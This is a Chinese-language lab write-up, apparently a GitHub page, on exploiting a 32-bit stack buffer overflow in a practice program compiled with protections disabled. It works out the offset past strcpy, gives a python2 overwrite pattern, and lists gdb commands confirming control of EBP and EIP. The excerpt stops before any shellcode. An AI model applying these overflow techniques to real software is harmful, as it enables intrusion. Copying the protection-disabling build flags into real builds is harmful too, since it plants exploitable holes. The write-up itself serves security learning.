

```shell
gcc -m32 -g -fno-stack-protector -no-pie -fno-pie exploit_me_2.c -o exploit_me_2 -z execstack
```

<img width="339" height="103" alt="image" src="https://github.com/user-attachments/assets/029ba60b-e569-4baf-98a2-d8c4538ed447" />

这个程序通过命令行参数传参给strcpy

<img width="656" height="646" alt="image" src="https://github.com/user-attachments/assets/e8f7292e-6e78-4188-b8f4-0e09eeb836c3" />

在这里分配内存空间并且把值复制过去。 计算offset

0x6c + 4 = 112

这个大小足够我们插入shellcode

尝试覆盖EIP

```shell
python2 -c 'print "A" * 108 + "B" * 4 + "C" *4'

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC
```

接着，我们来动态调试验证一下：

首先，我们在strcpy的下一条指令下断点：

<img width="654" height="285" alt="image" src="https://github.com/user-attachments/assets/4e0f74db-4ceb-4f19-a21b-fab8756c2037" />

然后通过命令行参数传入：

```
r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC
```

接着，打印内存：

```
x/120x $esp
x/x $ebp
x/x $eip
x/x $ebp-0x6c
```

<img width="798" height="758" alt="image" src="https://github.com/user-attachments/assets/69c1cc62-ca46-4212-bb89-fd49ee35f481" />

发现我们成功控制EBP是对的。 并且拿到 user_input在内存中的起始地址是： `0xbfffee7c`

继续ni单步执行，进行几条指令后，函数return，return后eip的地址指向了我们控制的CCCC值：

<img width="894" height="500" alt="image" src="https://github.com/user-attachments/assets/ea657686-119d-40fd-ae11-669a1accb530" />






